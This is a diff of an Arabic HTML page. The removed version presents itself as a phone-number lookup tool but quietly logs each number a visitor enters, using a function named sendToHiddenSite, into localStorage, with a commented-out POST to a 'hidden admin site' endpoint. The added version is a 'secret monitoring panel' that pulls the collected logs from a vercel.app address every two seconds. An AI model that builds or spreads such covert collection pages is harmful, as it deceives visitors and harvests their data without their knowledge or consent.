@@ -3,108 +3,73 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>منصة الاستعلام المتقدم</title>
-    <!-- تضمين Tailwind CSS للتصميم -->
+    <title>لوحة التحكم الخفية</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <!-- تضمين مكتبة libphonenumber-js لتحليل كافة تفاصيل الأرقام دولياً -->
-    <script src="https://unpkg.com/libphonenumber-js@1.11.3/bundle/libphonenumber-max.js"></script>
 </head>
-<body class="bg-slate-900 text-slate-100 min-h-screen flex items-center justify-center p-4">
-    <div class="max-w-lg w-full bg-slate-800 rounded-2xl shadow-2xl p-8 border border-slate-700">
-        <h1 class="text-2xl font-bold text-center mb-2 text-emerald-400">الاستعلام الشامل عن الأرقام</h1>
-        <p class="text-slate-400 text-center text-sm mb-6">أدخل رقم الهاتف مع رمز الدولة لتحليل البيانات بدقة</p>
-        
-        <div class="space-y-4">
+<body class="bg-slate-950 text-slate-100 min-h-screen p-6">
+    <div class="max-w-5xl mx-auto">
+        <div class="flex justify-between items-center mb-6 border-b border-slate-800 pb-4">
             <div>
-                <label class="block text-sm font-medium text-slate-300 mb-2">رقم الهاتف الدولي</label>
-                <input type="text" id="phoneInput" placeholder="مثال: +201012345678 أو +15551234567" 
-                    class="w-full bg-slate-900 border border-slate-700 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-emerald-500 transition">
+                <h1 class="text-2xl font-bold text-emerald-400">لوحة التحكم والمتابعة السرية</h1>
+                <p class="text-slate-400 text-xs mt-1">إجمالي السجلات الواردة: <span id="logCount" class="text-emerald-400 font-bold">0</span></p>
             </div>
-            
-            <button onclick="handleLookup()" 
-                class="w-full bg-emerald-600 hover:bg-emerald-500 text-white font-semibold py-3 rounded-xl transition shadow-lg shadow-emerald-900/30">
-                بدء الفحص والتحليل العميق
-            </button>
         </div>
 
-        <div id="resultBox" class="mt-6 hidden bg-slate-900 p-5 rounded-xl border border-slate-700 text-sm space-y-2">
-            <!-- ستظهر نتائج التحليل هنا -->
+        <div class="bg-slate-900 rounded-2xl border border-slate-800 overflow-hidden shadow-2xl">
+            <div class="overflow-x-auto">
+                <table class="w-full text-right border-collapse">
+                    <thead>
+                        <tr class="bg-slate-800/80 text-slate-300 text-xs uppercase tracking-wider">
+                            <th class="p-4">الرقم الدولي</th>
+                            <th class="p-4">الرقم المحلي</th>
+                            <th class="p-4">رمز الدولة</th>
+                            <th class="p-4">نوع الخط</th>
+                            <th class="p-4">وقت الاستعلام</th>
+                        </tr>
+                    </thead>
+                    <tbody id="adminTableBody" class="divide-y divide-slate-800/60 text-sm">
+                        <tr><td colspan="5" class="p-8 text-center text-slate-500">جاري انتظار البيانات الواردة...</td></tr>
+                    </tbody>
+                </table>
+            </div>
         </div>
     </div>
 
     <script>
-        // ضع هنا رابط أو مسار الموقع الخفي أو الـ Endpoint الخاص بك لاستقبال البيانات
-        const ADMIN_ENDPOINT = "https://your-hidden-admin-site.com/api/save"; // يمكنك تعديله لاحقاً
+        // ضع هنا رابط جلب البيانات (API Endpoint) الذي يقوم بسحب السجلات من السيرفر أو قاعدة البيانات الخاصة بك
+        const FETCH_DATA_URL = "infinity-craft-chi.vercel.app";
 
-        function handleLookup() {
-            const rawPhone = document.getElementById('phoneInput').value.trim();
-            const resultBox = document.getElementById('resultBox');
-
-            if (!rawPhone) {
-                alert("يرجى إدخال رقم الهاتف أولاً.");
-                return;
-            }
+        async function loadDashboardLogs() {
+            const tbody = document.getElementById('adminTableBody');
 
             try {
-                // تحليل الرقم باستخدام مكتبة libphonenumber-js
-                const phoneNumber = libphonenumber.parsePhoneNumberFromString(rawPhone);
+                const response = await fetch(FETCH_DATA_URL);
+                const storedLogs = await response.json();
+                
+                document.getElementById('logCount').innerText = storedLogs.length;
 
-                if (!phoneNumber || !phoneNumber.isValid()) {
-                    resultBox.classList.remove('hidden');
-                    resultBox.innerHTML = `<p class="text-red-400 font-semibold text-center">الرقم غير صالح أو غير مدعوم دولياً.</p>`;
+                if (storedLogs.length === 0) {
+                    tbody.innerHTML = `<tr><td colspan="5" class="p-8 text-center text-slate-500">لا توجد سجلات مسجلة حتى الآن.</td></tr>`;
                     return;
                 }
 
-                // استخراج معلومات عميقة وشاملة
-                const data = {
-                    internationalFormat: phoneNumber.formatInternational(),
-                    nationalFormat: phoneNumber.formatNational(),
-                    countryCode: phoneNumber.country,
-                    countryCallingCode: phoneNumber.countryCallingCode,
-                    numberType: phoneNumber.getType() || "غير معروف",
-                    possibleLengths: phoneNumber.possibleLengths ? Array.from(phoneNumber.possibleLengths()).join(', ') : "متاح",
-                    timestamp: new Date().toISOString()
-                };
-
-                // حفظ وإرسال البيانات للموقع الخفي (كمثال عبر localStorage أو إرسال API)
-                sendToHiddenSite(data);
-
-                // عرض النتائج على واجهة المستخدم بشكل احترافي
-                resultBox.classList.remove('hidden');
-                resultBox.innerHTML = `
-                    <p class="text-emerald-400 font-bold mb-3 border-b border-slate-800 pb-2">نتائج التحليل الشامل:</p>
-                    <div class="space-y-1.5 text-slate-300">
-                        <p><b>الرقم الدولي:</b> <span class="text-emerald-300 font-mono">${data.internationalFormat}</span></p>
-                        <p><b>الرقم المحلي:</b> <span class="font-mono">${data.nationalFormat}</span></p>
-                        <p><b>رمز الدولة:</b> +${data.countryCallingCode} (${data.countryCode})</p>
-                        <p><b>نوع الخط:</b> ${data.numberType}</p>
-                    </div>
-                `;
-            } catch (error) {
-                console.error("خطأ في المعالجة:", error);
+                tbody.innerHTML = storedLogs.map(log => `
+                    <tr class="hover:bg-slate-850 transition">
+                        <td class="p-4 font-mono text-emerald-300">${log.internationalFormat}</td>
+                        <td class="p-4 font-mono text-slate-300">${log.nationalFormat}</td>
+                        <td class="p-4">${log.countryCode} (+${log.countryCallingCode})</td>
+                        <td class="p-4"><span class="bg-slate-800 text-emerald-400 text-xs px-2.5 py-1 rounded-full border border-slate-700">${log.numberType}</span></td>
+                        <td class="p-4 text-slate-400 text-xs">${new Date(log.timestamp).toLocaleString()}</td>
+                    </tr>
+                `).join('');
+            } catch (err) {
+                console.error("فشل في جلب السجلات:", err);
             }
         }
 
-        function sendToHiddenSite(payload) {
-            try {
-                // حفظ البيانات في التخزين المشترك أو إرسالها للرابط المخصص
-                let logs = JSON.parse(localStorage.getItem("system_global_logs") || "[]");
-                logs.unshift(payload);
-                localStorage.setItem("system_global_logs", JSON.stringify(logs));
-
-                // إذا كان لديك سيرفر خارجي للموقع الخفي، يمكنك تفعيل هذا الكود:
-                /*
-                fetch(ADMIN_ENDPOINT, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                }).catch(err => console.log("Hidden sync error:", err));
-                */
-            } catch (e) {
-                console.error("فشل إرسال البيانات للموقع الخفي:", e);
-            }
-        }
+        // تحديث تلقائي كل ثانيتين لجلب السجلات الجديدة فور حدوثها
+        setInterval(loadDashboardLogs, 2000);
+        window.onload = loadDashboardLogs;
     </script>
 </body>
-    </html>
-    
+</html>
